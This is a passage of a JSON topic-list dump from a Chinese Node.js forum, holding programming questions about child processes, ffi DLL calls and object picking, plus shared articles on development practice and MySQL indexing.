class=\"markdown-text\"><p>哪位大神知道，我在程序里用child_process exec方法调起另外一个程序，关闭了主程序之后，被调起的程序也立马关了，请问有啥其他办法吗</p>\n</div>","title":"求助，关于nodejs运行外部exe","last_reply_at":"2019-01-09T05:23:10.744Z","good":false,"top":false,"reply_count":2,"visit_count":648,"create_at":"2019-01-09T04:14:59.950Z","author":{"loginname":"ZhangJian01","avatar_url":"https://avatars1.githubusercontent.com/u/18729573?v=4&s=120"}},{"id":"5c3564f43898674067a7ce8d","author_id":"59aa89ea9e95202d08c91ed3","tab":"ask","content":"<div class=\"markdown-text\"><p>RT</p>\n</div>","title":"哪位大大做的prism-kangaroo.glitch.me搜索，没用了~能改进一番吗~确实很好用","last_reply_at":"2019-01-09T03:05:24.778Z","good":false,"top":false,"reply_count":0,"visit_count":572,"create_at":"2019-01-09T03:05:24.778Z","author":{"loginname":"xinggsf","avatar_url":"https://avatars3.githubusercontent.com/u/13033798?v=4&s=120"}},{"id":"5c3450235bf06c5e7e3f29f6","author_id":"5b8fc64537b3005a0b0e6bb6","tab":"ask","content":"<div class=\"markdown-text\"><p>我用vscode调试Node代码，程序跑到一半显示进程退出，但是又没有详细日志，请问vscode有在本地存储运行日志吗？<img src=\"//static.cnodejs.org/Fpf_szTgEaIb199DLYWN9oKF871P\" alt=\"1546932213(1).jpg\"></p>\n</div>","title":"VSCode运行日志有本地文件吗？","last_reply_at":"2019-01-09T00:45:37.356Z","good":false,"top":false,"reply_count":1,"visit_count":686,"create_at":"2019-01-08T07:24:19.831Z","author":{"loginname":"misland","avatar_url":"https://avatars3.githubusercontent.com/u/10702423?v=4&s=120"}},{"id":"5c3352595bf06c5e7e3f24d4","author_id":"5b8fc64537b3005a0b0e6bb6","tab":"ask","content":"<div class=\"markdown-text\"><p>是这样的，我在研究一个技术可行性，就是通过Nodejs调用C++的dll，目前通过ffi这个插件实现的，我对C++并不熟悉，前面自己写了个测试的C++的dll调用成功了，证明可行，于是继续研究调用一个视频采集卡的dll，本以为很简单，结果第一个方法就被挡住了。\nC++头文件中方法声明如下：\n<code>QCAP_CREATE( CHAR * pszDevName /*IN*/, UINT iDevNum /*IN*/, HWND hAttachedWindow /*IN*/, PVOID * ppDevice /*OUT*/, BOOL bThumbDraw = FALSE /*IN*/, BOOL bMaintainAspectRatio = FALSE /*IN*/ );</code>\n这个方法的第三个参数要求传递一个窗口的句柄，用于显示采集卡的影像,当然也可以不传，传一个空指针也行，由于要跨语言，类型转换是个大问题，为了稳妥起见，我先在我熟悉的C#里试了一下，调用具体代码如下：</p>\n<pre class=\"prettyprint language-\"><code>[DllImport(@&quot;D:\\01work\\01code\\video\\code\\VideoDemo\\CPlusPlus\\obj\\Debug\\QCAP.X64.DLL&quot;, EntryPoint = &quot;QCAP_CREATE&quot;)]\npublic static extern ulong QCAP_CREATE(string deviceName, UInt32 iDevNum, IntPtr hAttachedWindow, out IntPtr ppDevice, bool bThumbDraw, bool bMaintainAspectRatio);\n&#x2F;&#x2F;引入后调用\nvar result = QCAP_CREATE(&quot;CY3014 USB&quot;, 0, IntPtr.Zero, out ppDevice, true, false);\n</code></pre><p>第三个参数通过IntPtr.Zero传递一个空的指针，很顺利就成功了，以为很简单，于是继续在Node中试验，对于类型我使用了ref这个工具包来向dll传递参数，具体代码如下：</p>\n<pre class=\"prettyprint\"><code> const ffi = require(&#x27;ffi&#x27;);\nconst ref = require(&#x27;ref&#x27;);\nconst path = require(&#x27;path&#x27;);\nlet dllPath = path.join(__dirname, &#x27;&#x2F;QCAP.X64&#x27;);\nlet intPtr = ref.refType(&#x27;int&#x27;);\nlet QCAP = ffi.Library(dllPath, {\n  &#x27;QCAP_CREATE&#x27;: [ref.types.ulong, [ref.types.CString, ref.types.uint, intPtr, intPtr, ref.types.bool, ref.types.bool]]\n});\n  let ppdevice = ref.alloc(&#x27;int&#x27;);\n  let NULL = ref.NULL;\n  &#x2F;&#x2F;初始化采集卡\n let initResult = QCAP.QCAP_CREATE(&#x27;CY3014 USB&#x27;, 0, NULL, ppdevice, true, false);\n</code></pre><p>我看了ref的源码，ref.NULL的解释如下：\n**A Buffer that references the C NULL pointer. **\n于是上面最后一行代码第三个参数我试图通过ref.NULL传递一个空指针，结果方法始终提示第三个参数错误，各种google和百度，折腾了一天还是无果，感觉好沮丧，来社区请教一下社区的老师们，有没有哪位老师能指点一下呢，任何帮助都很感谢</p>\n</div>","title":"感觉好窝囊，被一个自认为简单的小问题绊了一整天","last_reply_at":"2019-01-09T00:31:26.698Z","good":false,"top":false,"reply_count":4,"visit_count":1049,"create_at":"2019-01-07T13:21:29.281Z","author":{"loginname":"misland","avatar_url":"https://avatars3.githubusercontent.com/u/10702423?v=4&s=120"}},{"id":"5c349ea55bf06c5e7e3f2cc4","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FnlaJ8EpFZSmTWfgXN4gpTyAAUR6\" alt=\"image.png\"></p>\n</div>","title":"请问下图片、视频等资源存储，选用七牛下的哪款产品~~","last_reply_at":"2019-01-08T13:35:02.515Z","good":false,"top":false,"reply_count":2,"visit_count":570,"create_at":"2019-01-08T12:59:17.979Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c3037a13898674067a7b7a7","author_id":"58dc892303d476b42d34c8bd","tab":"share","content":"<div class=\"markdown-text\"><p>《C/C++面向WebAssembly编程》开源图书初稿完成，欢迎关注。</p>\n<p><a href=\"https://github.com/3dgen/cppwasm-book\">https://github.com/3dgen/cppwasm-book</a></p>\n<p><img src=\"//static.cnodejs.org/Fvuw0z6MFyHAPPmd6cYAgcTsCPgR\" alt=\"cover.jpg\"></p>\n</div>","title":"《C/C++面向WebAssembly编程》开源图书初稿完成","last_reply_at":"2019-01-08T10:01:27.173Z","good":false,"top":false,"reply_count":3,"visit_count":841,"create_at":"2019-01-05T04:50:41.186Z","author":{"loginname":"chai2010","avatar_url":"https://avatars1.githubusercontent.com/u/2295542?v=4&s=120"}},{"id":"5c28ec7476c4964062a1f487","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>就是我在看别人写的代码里面有<code>return res.redirect()</code>也有<code>res.redierect()</code>有点困惑这个方法的使用。</p>\n</div>","title":"express框架中res.redirect()重定向之后，后面的代码还会执行吗？","last_reply_at":"2019-01-08T08:52:40.137Z","good":false,"top":false,"reply_count":7,"visit_count":1140,"create_at":"2018-12-30T16:04:04.132Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5c31d60d5bf06c5e7e3f1d37","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>请问下做一个掘金这样的网站，需要功能有文章搜索、获取文章列表、热门推荐、个性推荐等功能，请问数据库怎么选型？</p>\n<p>用 mysql 是否可以，或者有其他更适合此类型项目的数据库推荐？</p>\n</div>","title":"请问下做一个掘金这样的网站，文章搜索、获取文章列表，请问数据库怎么选型？","last_reply_at":"2019-01-08T07:21:26.772Z","good":false,"top":false,"reply_count":6,"visit_count":1052,"create_at":"2019-01-06T10:18:53.528Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c330cac5bf06c5e7e3f22b8","author_id":"5c2e23963898674067a7ae2b","tab":"ask","content":"<div class=\"markdown-text\"><p>lodash 有 pick 这个方法</p>\n<pre class=\"prettyprint\"><code>var object = { &#x27;a&#x27;: 1, &#x27;b&#x27;: &#x27;2&#x27;, &#x27;c&#x27;: 3 };\n \n_.pick(object, [&#x27;a&#x27;, &#x27;c&#x27;]);\n&#x2F;&#x2F; =&gt; { &#x27;a&#x27;: 1, &#x27;c&#x27;: 3 }\n</code></pre><p>但是 object 如果是一个嵌套的对象的话，就要写很多代码。\n我自己写了一个 deeppick 的轮子。</p>\n<pre class=\"prettyprint\"><code>const api: OpenAPIObject = {\n  openapi: &quot;3.0.1&quot;,\n  info: {\n    version: &quot;1.0&quot;,\n    title: &quot;test-rest&quot;,\n    description: &quot;swagger3.0.1 api docs&quot;,\n  },\n  paths: {\n    &quot;api&#x2F;v1&#x2F;cases&quot;: {\n      get: {\n        tags: [&quot;case-controller&quot;],\n        summary: &quot;获取病历列表&quot;,\n        parameters: [\n          {\n            name: &quot;department_id&quot;,\n            in: &quot;query&quot;,\n            description: &quot;科室ID&quot;,\n            required: false,\n            schema: {\n              type: &quot;integer&quot;,\n              format: &quot;int32&quot;,\n            },\n          },\n          {\n            name: &quot;patient_name&quot;,\n            in: &quot;query&quot;,\n            description: &quot;姓名&quot;,\n            required: false,\n            schema: {\n              type: &quot;string&quot;,\n            },\n          },\n        ],\n      },\n    },\n  },\n};\n\nconst objectPicker = {\n  paths: new MapPicker({\n    get: {\n      summary: true,\n      parameters: new ArrayPicker({\n        in: true,\n        required: true,\n      }),\n    },\n  }),\n};\n\nconst expectResult = {\n  paths: {\n    &quot;api&#x2F;v1&#x2F;cases&quot;: {\n      get: {\n        summary: &quot;获取病历列表&quot;,\n        parameters: [\n          { in: &quot;query&quot;, required: false },\n          { in: &quot;query&quot;, required: false },\n        ],\n      },\n    },\n  },\n};\n\nexpect(deepPick(api, objectPicker)).toEqual(expectResult);\n</code></pre><p>函数效果如上。\n虽然我自己写好了，但是我觉得应该前人已经造过现成的轮子了。请问有人见过类似的轮子吗？</p>\n</div>","title":"如果从对象中取一部分属性，请问有什么现成的轮子","last_reply_at":"2019-01-08T03:09:28.565Z","good":false,"top":false,"reply_count":5,"visit_count":793,"create_at":"2019-01-07T08:24:12.718Z","author":{"loginname":"DiamondYuan","avatar_url":"https://avatars1.githubusercontent.com/u/9692408?v=4&s=120"}},{"id":"5c2ed18a5bf06c5e7e3f1164","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>在一线做了十年的开发，经历了网易、百度、腾讯研究院、MIG 等几个地方，陆续做过 3D 游戏、2D 页游、浏览器、移动端翻译 app 等。</p>\n<p>积累了一些感悟。必然有依然幼稚的地方，就当抛砖引玉，聊为笑谈。</p>\n<h2>一、对于团队而言，流程太重要了</h2>\n<p>行军打仗，你需要一个向导；如果没有向导，你需要一个地图；如果没有地图，至少要学习李广，找一匹识途的老马；如果你连老马也没有，那最好可以三个臭皮匠好好讨论，力图胜过一个诸葛亮；如果三个臭皮匠连好好讨论也做不到，那就是典型的乌合之众了，最好写代码前，点上三炷香，斟上一杯浊酒，先拜拜菩萨，再拜拜谷歌。</p>\n<p>我个人属于性格温和的（程序员大多性格不错），但确实见过少数强势的人，说很多强势的话。在技术上一言而决，一听到任何反对就上升到私人恩怨。这样的风格，到底是刚愎自用，还是胸有成竹，就需要仔细判断了。</p>\n<p>为什么说流程重要呢？实际上，如果团队上有孙悟空存在，去西天取经，大概也不需要什么流程，只要方向就可以了。 但作为普通的战士，应该先虑败。找人算命时，应该先听听不好的地方，好的地方就不用听了，总归是好的，不好的地方一定要听，这样才能规避。</p>\n<p>这就是我的态度：先悲观一点，划清底线，考虑在这个底线上你该怎么做？</p>\n<p>这是我做开发的一个习惯，但这个习惯肯定不适用于买房。</p>\n<p>怎么划清底线呢？就是假想团队中没有孙悟空了，光靠你唐玄奘、猪八戒和沙和尚，应该怎么去取经。</p>\n<p>这个月走什么地方，遇到山怎么走，遇到河怎么过，遇到路上有妖怪劫道，谁去抵挡。遇到路上有少女要搭救，怎么办？这就是流程，是原则。</p>\n<p>我经历过一个流程很混乱的阶段。都是很多年前的事情了，可以拿出来说说，不涉及单个人。</p>\n<p>2011年在百度浏览器团队时遇到几件让人影响深刻的事情。 有一次开会，产品拿出 Google 某个产品的 DEMO，里面有一段很酷炫 3D 效果，要求开发加上，只给2天时间，大家目瞪口呆。后续的开发为了赶节奏，导致非常多的 bug ，又为了修改 bug ，leader 将所有的 bug 按照人员平均分配，导致不同模块间的同学相互修改…实在难以想象。好比让做花卷的厨子，去修改西湖醋鱼的味道。</p>\n<p>最初的现象是：bug下降的慢，延伸 bug 反而增加，每个人都累的半死，代码风格极其杂乱，为了赶工导致的临时方案层出不穷；</p>\n<p>到了中期：人员离职越来也多，代码难以维护，新加的需求与之前的临时方案冲突。</p>\n<p>到了后期：想做一些修复，想调整架构，又要保证正常运行，其难度好比在一架飞行的飞机上拆换零件。</p>\n<p>然后我也急忙离职了…实在看不到成功的可能性。</p>\n<p>后来到了腾讯的团队，感觉流程就规范多了。需求和 bug 有 Tapd 跟踪，产品发布按照节奏，需求提出前会和开发反复讨论可行性，有专门的质量跟踪，有专门的用户反馈，每天知道要做什么，也知道明天要做什么。有产品需求，也有开发需求！这个非常重要。很多团队，都是只有产品需求，开发好像牛一样，耕完地就不管了？</p>\n<p>**流程其实没那么复杂，就是各司其责+节奏。我们都是“哆瑞咪发梭拉西多”中的一员，各自有各自的责任，然后组合在一起，按照一个节奏跑起来。**把该做的事情与该跑的节奏定好。</p>\n<h2>二、不要炫技，老老实实写代码</h2>\n<p>网上有一个段子，说有人要用JS实现一个简单的功能，然后朋友给他推荐了几十个库。</p>\n<p>真的有必要吗？具体情况具体分析。</p>\n<p>居家过日子，你只需要一套普通的工具就可以了；如果你是修车的，你需要一套修车的工具；如果你是光头强，你需要一台伐木机。   吃饭用筷子，用刀叉，都可以，但不要用杀猪刀，不要用丈八长矛！，当然也不能用牙签。</p>\n<p>用什么工具，用什么库，问问过来人，多在KM上搜索一下。举个例子：android 上加密，用 SQLChpher就可以了，微信也在用，你当然可以学习；数据库 ORM 思想，用 KM 上推荐的 GreenDAO 就可以了；PC 上 3D 引擎，用OGRE就可以了；小型游戏 DEMO，用 Irrlicht 足够；写 WebGL，用 ThreeJS 足够。</p>\n<p>首先想想：一些大库 hold 的住吗，后续发展如何？这些库对安装包的体积影响有多大？有没有调研过同样的产品在用什么？</p>\n<p>想清楚了再决定用什么，最好是跟随成功项目的脚步。</p>\n<h2>三、架构上实用+适用</h2>\n<p>很喜欢曾国藩的一句话：结硬寨、打呆仗。</p>\n<p>一字长蛇阵、八门金锁阵，哪个好？iOS 都是单个进程，微信 Android 版本3.5以前是单进程，3.5以后有独立的网络进程； PC 浏览器的进程架构更加复杂，UI 进程、内核进程、Render 进程，而且还有根据页面多少的进程调节模型。</p>\n<p>这些设计都很好，各有各的道理，都适用于当前的产品。所以我的观点是：首先分析当前产品的规模、性质，然后再设计架构。</p>\n<p>在当前阶段达到：开发效率+架构的平衡；并向后展望3个月，或者半年左右，看看架构能不能适应。</p>\n<p>我做腾讯翻译君时，曾反复犹豫要不要模仿微信加入独立的网络进程。后来逆向了有排在第一二位的竞品，最终采用了现在的主功能单进程模型。</p>\n<p>产品规模、人员规模、功能阶段，具体问题具体分析。</p>\n<h2>四、既要有攻城之力，也要有熬战之气——BUG</h2>\n<p>产品开发完成后，必然有 bug 。<strong>其实开发人员在工作过程中，是有一定的直觉或者心理预判的，即：某个功能模块的质量如何。 这里面的质量包括：可维护性、扩展性、算法\\渲染效率，还有就是bug与崩溃率。</strong></p>\n<p>功能开发完成后，就要开始守城了。</p>\n<p>bug，一部分产生是由于架构带来的，例如比较复杂的架构，会导致复杂的实现细节；</p>\n<p>但还有很大部分bug，其实是基于如下三个原因产生的：</p>\n<p><strong>1 .</strong> 对于某个api的不了解，或者对于某个平台，或者 SDK 版本的不了解。 举例而言：android里面非主线程，是不能直接处理UI相关的事情的；JAVA 的内存释放也不是绝对的，相互指向是无法释放的；函数个数是有DEX问题制约的---------------------这些bug的产生，也是开发人员摸索学习的过程，经历过一次就不会再犯了。这是学习广度与熟练度的问题；</p>\n<p><strong>2 .</strong> 还有一些bug，是由于粗心大意导致的。例如空指针的问题，野指针的问题。在 C 的开发中，野指针的问题，GDI 句柄的释放问题，这些都是严谨的代码需要避免的； 而又一些工具，或者方法是可以规避这些问题的，例如 android中 的利用@ Nullable 和@ NonNull 加强空指针检测等方法；</p>\n<p><strong>3 .</strong>  还有一些bug，是由于“使用情况各异导致的”。例如：偶现在某个模块crash。这里的本质还是因为逻辑的异常边界没有处理好。例如 android 上的 OOM 问题，还有 PC 上 UI 焦点导致的对象释放问题。这些异常情况，一部分靠测试发现，一部分靠用户反馈，还有一部分就靠自己的异常处理。例如Android中的try catch机制，其实就是遇到异常了，你能纠正错误的机会。</p>\n<h2>五、自审</h2>\n<p>每过一段时间，都要站在高空俯视自己，问问：到底是在承担过去，还是在改变未来。</p>\n<p>如果之前程序代码质量不好，后面修改问题的时间就会比较多。到了开发的中期，得多问问自己，你在不停的改正以前的错误，还是在做新的东西。 如果修改错误的时间多一点，那就要注意自己的代码质量了！</p>\n<h2>六、注释</h2>\n<p>我很喜欢写注释。有大牛说：代码就是最好的注释。 可惜我还没有达到那个程度。所以，我会把注释写的非常清楚。其一：为了自己以后维护的方便； 其二：为了其他人接手的方便。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1490080644651_3764_1490080644840.png\" alt=\"img\"></p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1490080683537_3834_1490080683713.png\" alt=\"img\"></p>\n<p>这是我在翻译君项目中写注释的方式。1：对于很复杂的逻辑，务必用12345的顺序依次写清楚；2 ：对于函数中的某个参数，需要解释为什么要设置这个参数，尤其是公用工具类里面的函数—说清楚参数的背景含义，可以让其他调用者理解的更加清晰。</p>\n<p>我一般不用英文写。虽然这样看起来格调很低，但胜在大家都能轻松的看懂。<strong>写代码不能太傲娇，写注释也不要太傲娇，目的是让你的搭档或者接手者，更轻松的理解，让她/他少加班。</strong></p>\n<h2>七、代码结构</h2>\n<p>代码结构要清晰。有按照功能划分的，有按照 UI 结构划分的。还有公用工具类，有数据管理，有主逻辑控制。不管用哪种思想，有序的代码结构，可以让每个人感觉很干净。好比日本的收纳整理技巧让很多小资推崇，无非就是干净、整洁、便于管理。</p>\n<p>而且，还有一个重要的好处：<strong>代码结构表现出来的其实是——程序的一个模块\\逻辑思想——让大家工作在不同的区域。</strong></p>\n<h2>八、代码风格</h2>\n<p>代码风格统一！好比一家人，有叫 Tom 的，有叫安东尼的，还有叫流川枫、石破天、圣杰夫拉斯基，无所适从。理论上，看一个函数，就能从名称上区分哪些是成员变量，哪些是局部变量，哪些是全局静态值。</p>\n<p>除了命名统一外，还有一行代码最大的宽度，函数的连续调用长度等，头文件的包含风格，也最好有一个约定。类的出现时间，创建人名，最好也加上，看起来没用，但到了追踪问题时，就能看出时间线的好处。</p>\n<h2>九、安全与逆向</h2>\n<p>这是针对Android说的，还有PC插件也需要考虑。Android 上首先要防止被别人逆向，我成功逆向并重新打包过有第一位和第二位的竞品。这似乎有点不可思议，但确实做到了。加固+混淆+代码判断，最好都有。</p>\n<p>安全上，可以看金刚扫描的漏洞，逐一修改就行。公司很多工具很好用的！</p>\n<h2>十、开发效率</h2>\n<p>开发效率可以用这些方式提升：</p>\n<p><strong>1 .</strong> 构建公用工具类，方便大家使用</p>\n<p><strong>2 .</strong> 使用开源的一些包，例如 ORM 思想的数据库等</p>\n<p><strong>3 .</strong> 可以很快的找到问题。开发中，找 bug 的时间，往往是很多的。我用的方法有3个： 使用 try catch； 拦截所有 crash 到我指定的地方；超多的 Log，Log 有统一的控制开关。</p>\n<p><strong>4 .</strong> 借力：数据上报用灯塔，崩溃上报用 bugly，公司 KM 上很多经验，拿过来用。</p>\n<h2>十一、安装包体积</h2>\n<p><strong>1 .</strong>  TINY 压缩图片</p>\n<p><strong>2 .</strong> 删除无效的资源文件</p>\n<h2>十二、UI渲染效率</h2>\n<p>UI 是用户的第一感觉；UI 快并稳定，第一感觉就不会差太多；管理好内存，基本管理好了一半 crash；管理好 UI，等于管理了人机交互感受。</p>\n<p>UI 上的开发是：渲染效率与渲染效果的平衡。</p>\n<p>很匆忙的写的，必然有很幼稚的地方，欢迎斧正。</p>\n<p><strong>此文已由作者授权腾讯云+社区在各渠道发布</strong></p>\n<p><strong>获取更多新鲜技术干货，可以关注我们腾讯云技术社区-云加社区官方号及知乎机构号</strong></p>\n</div>","title":"做开发十年，我总结出了这些开发经验","last_reply_at":"2019-01-08T02:36:41.801Z","good":false,"top":false,"reply_count":4,"visit_count":1296,"create_at":"2019-01-04T03:22:50.622Z","author":{"loginname":"qcommunitycloud","avatar_url":"https://avatars2.githubusercontent.com/u/45935731?v=4&s=120"}},{"id":"5c2c8e133898674067a7a4d5","author_id":"5c176d22f3d48d2397c12134","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>本文由云+社区发表</p>\n</blockquote>\n<p>文章《MySQL查询分析》讲述了使用MySQL慢查询和explain命令来定位mysql性能瓶颈的方法，定位出性能瓶颈的sql语句后，则需要对低效的sql语句进行优化。本文主要讨论MySQL索引原理及常用的sql查询优化。</p>\n<h2>一个简单的对比测试</h2>\n<p>前面的案例中，c2c_zwdb.t_file_count表只有一个自增id，FFileName字段未加索引的sql执行情况如下：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493033820022_415_1493033820317.jpg\" alt=\"img\"></p>\n<p>在上图中，type=all，key=null，rows=33777。该sql未使用索引，是一个效率非常低的全表扫描。如果加上联合查询和其他一些约束条件，数据库会疯狂的消耗内存，并且会影响前端程序的执行。</p>\n<p>这时给FFileName字段添加一个索引：</p>\n<p>alter table c2c_zwdb.t_file_count add index index_title(FFileName);</p>\n<p>再次执行上述查询语句，其对比很明显：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493033843734_1326_1493033844036.jpg\" alt=\"img\"></p>\n<p>在该图中，type=ref，key=索引名（index_title），rows=1。该sql使用了索引index_title，且是一个常数扫描，根据索引只扫描了一行。</p>\n<p>比起未加索引的情况，加了索引后，查询效率对比非常明显。</p>\n<h3>MySQL索引</h3>\n<p>通过上面的对比测试可以看出，索引是快速搜索的关键。MySQL索引的建立对于MySQL的高效运行是很重要的。对于少量的数据，没有合适的索引影响不是很大，但是，当随着数据量的增加，性能会急剧下降。如果对多列进行索引(组合索引)，列的顺序非常重要，MySQL仅能对索引最左边的前缀进行有效的查找。</p>\n<p>下面介绍几种常见的MySQL索引类型。</p>\n<p>索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。</p>\n<h4>1、MySQL索引类型</h4>\n<p><strong>(1) 主键索引 PRIMARY KEY</strong></p>\n<p>它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493033926180_6384_1493033926439.jpg\" alt=\"img\"></p>\n<p>当然也可以用 ALTER 命令。记住：一个表只能有一个主键。</p>\n<p><strong>(2) 唯一索引 UNIQUE</strong></p>\n<p>唯一索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。可以在创建表的时候指定，也可以修改表结构，如：</p>\n<p>ALTER TABLE <code>table_name</code> ADD UNIQUE (<code>column</code>)</p>\n<p><strong>(3) 普通索引 INDEX</strong></p>\n<p>这是最基本的索引，它没有任何限制。可以在创建表的时候指定，也可以修改表结构，如：</p>\n<p>ALTER TABLE <code>table_name</code> ADD INDEX index_name (<code>column</code>)</p>\n<p><strong>(4) 组合索引 INDEX</strong></p>\n<p>组合索引，即一个索引包含多个列。可以在创建表的时候指定，也可以修改表结构，如：</p>\n<p>ALTER TABLE <code>table_name</code> ADD INDEX index_name(<code>column1</code>, <code>column2</code>, <code>column3</code>)</p>\n<p><strong>(5) 全文索引 FULLTEXT</strong></p>\n<p>全文索引（也称全文检索）是目前搜索引擎使用的一种关键技术。它能够利用分词技术等多种算法智能分析出文本文字中关键字词的频率及重要性，然后按照一定的算法规则智能地筛选出我们想要的搜索结果。</p>\n<p>可以在创建表的时候指定，也可以修改表结构，如：</p>\n<p>ALTER TABLE <code>table_name</code> ADD FULLTEXT (<code>column</code>)</p>\n<h4>2、索引结构及原理</h4>\n<p>mysql中普遍使用B+Tree做索引，但在实现上又根据聚簇索引和非聚簇索引而不同，本文暂不讨论这点。</p>\n<p><strong>b+树介绍</strong></p>\n<p>下面这张b+树的图片在很多地方可以看到，之所以在这里也选取这张，是因为觉得这张图片可以很好的诠释索引的查找过程。</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034013688_4555_1493034014013.jpg\" alt=\"img\"></p>\n<p>如上图，是一颗b+树。浅蓝色的块我们称之为一个磁盘块，可以看到每个磁盘块包含几个数据项（深蓝色所示）和指针（黄色所示），如磁盘块1包含数据项17和35，包含指针P1、P2、P3，P1表示小于17的磁盘块，P2表示在17和35之间的磁盘块，P3表示大于35的磁盘块。</p>\n<p>真实的数据存在于叶子节点，即3、5、9、10、13、15、28、29、36、60、75、79、90、99。非叶子节点不存储真实的数据，只存储指引搜索方向的数据项，如17、35并不真实存在于数据表中。</p>\n<p><strong>查找过程</strong></p>\n<p>在上图中，如果要查找数据项29，那么首先会把磁盘块1由磁盘加载到内存，此时发生一次IO，在内存中用二分查找确定29在17和35之间，锁定磁盘块1的P2指针，内存时间因为非常短（相比磁盘的IO）可以忽略不计，通过磁盘块1的P2指针的磁盘地址把磁盘块3由磁盘加载到内存，发生第二次IO，29在26和30之间，锁定磁盘块3的P2指针，通过指针加载磁盘块8到内存，发生第三次IO，同时内存中做二分查找找到29，结束查询，总计三次IO。真实的情况是，3层的b+树可以表示上百万的数据，如果上百万的数据查找只需要三次IO，性能提高将是巨大的，如果没有索引，每个数据项都要发生一次IO，那么总共需要百万次的IO，显然成本非常非常高。</p>\n<p><strong>性质</strong></p>\n<p>(1) 索引字段要尽量的小。</p>\n<p>通过上面b+树的查找过程，或者通过真实的数据存在于叶子节点这个事实可知，IO次数取决于b+数的高度h。</p>\n<p>假设当前数据表的数据量为N，每个磁盘块的数据项的数量是m，则树高h=㏒(m+1)N，当数据量N一定的情况下，m越大，h越小；</p>\n<p>而m = 磁盘块的大小/数据项的大小，磁盘块的大小也就是一个数据页的大小，是固定的；如果数据项占的空间越小，数据项的数量m越多，树的高度h越低。这就是为什么每个数据项，即索引字段要尽量的小，比如int占4字节，要比bigint8字节少一半。</p>\n<p>(2) 索引的最左匹配特性。</p>\n<p>当b+树的数据项是复合的数据结构，比如(name,age,sex)的时候，b+数是按照从左到右的顺序来建立搜索树的，比如当(张三,20,F)这样的数据来检索的时候，b+树会优先比较name来确定下一步的所搜方向，如果name相同再依次比较age和sex，最后得到检索的数据；但当(20,F)这样的没有name的数据来的时候，b+树就不知道下一步该查哪个节点，因为建立搜索树的时候name就是第一个比较因子，必须要先根据name来搜索才能知道下一步去哪里查询。比如当(张三,F)这样的数据来检索时，b+树可以用name来指定搜索方向，但下一个字段age的缺失，所以只能把名字等于张三的数据都找到，然后再匹配性别是F的数据了， 这个是非常重要的性质，即索引的最左匹配特性。</p>\n<p><strong>建索引的几大原则</strong></p>\n<p>(1) 最左前缀匹配原则</p>\n<p>对于多列索引，总是从索引的最前面字段开始，接着往后，中间不能跳过。比如创建了多列索引(name,age,sex)，会先匹配name字段，再匹配age字段，再匹配sex字段的，中间不能跳过。mysql会一直向右匹配直到遇到范围查询(&gt;、&lt;、between、like)就停止匹配。</p>\n<p>一般，在创建多列索引时，where子句中使用最频繁的一列放在最左边。</p>\n<p>看一个补符合最左前缀匹配原则和符合该原则的对比例子。</p>\n<p>实例：表c2c_db.t_credit_detail建有索引(<code>Flistid</code>,<code>Fbank_listid</code>)</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034065436_3061_1493034065696.jpg\" alt=\"img\"></p>\n<p>不符合最左前缀匹配原则的sql语句：</p>\n<p>select * from t_credit_detail where Fbank_listid=‘201108010000199’\\G</p>\n<p>该sql直接用了第二个索引字段Fbank_listid，跳过了第一个索引字段Flistid，不符合最左前缀匹配原则。用explain命令查看sql语句的执行计划，如下图：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034093058_1626_1493034093293.jpg\" alt=\"img\"></p>\n<p>从上图可以看出，该sql未使用索引，是一个低效的全表扫描。</p>\n<p>符合最左前缀匹配原则的sql语句：</p>\n<p>select * from t_credit_detail where Flistid=‘2000000608201108010831508721’ and Fbank_listid=‘201108010000199’\\G</p>\n<p>该sql先使用了索引的第一个字段Flistid，再使用索引的第二个字段Fbank_listid，中间没有跳过，符合最左前缀匹配原则。用explain命令查看sql语句的执行计划，如下图：</p>\n<p><img src=\"https://blog-10039692.file.myqcloud.com/1493034315185_3370_1493034315498.jpg\" alt=\"img\"></p>\n<p>从上图可以看出，该sql使用了索引，仅扫描了一行。</p>\n<p>对比可知，符合最左前缀匹配原则的sql语句比不符合该原则的sql语句效率有极大提高，从全表扫描上升到了常数扫描。</p>\n<p>(2) 尽量选择区分度高的列作为索引。</p>\n<p>比如，我们会选择学号做索引，而不会选择性别来做索引。</p>\n<p>(3) =和in可以乱序</p>\n<p>比如a = 1 and b = 2 and c = 3，建立(a,b,c)索引可以任意顺序，mysql的查询优化器会帮你优化成索引可以识别的形式。</p>\n<p>(4) 索引列不能参与计算，保持列“干净”</p>\n<p>比如：Flistid+1&gt;‘2000000608201108010831508721‘。原因很简单，假如索引列参与计算的话，那每次检索时，都会先将索引计算一次，再做比较，显然成本太大。</p>\n<p>(5) 尽量的扩展索引，不要新建索引。</p>\n<p>比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。</p>\n<p><strong>索引的不足</strong></p>\n<p>虽然索引可以提高查询效率，但索引也有自己的不足之处。</p>\n<p>索引的额外开销：</p>\n<p>(1) 空间：索引需要占用空间；</p>\n<p>(2) 时间：查询索引需要时间；</p>\n<p>(3) 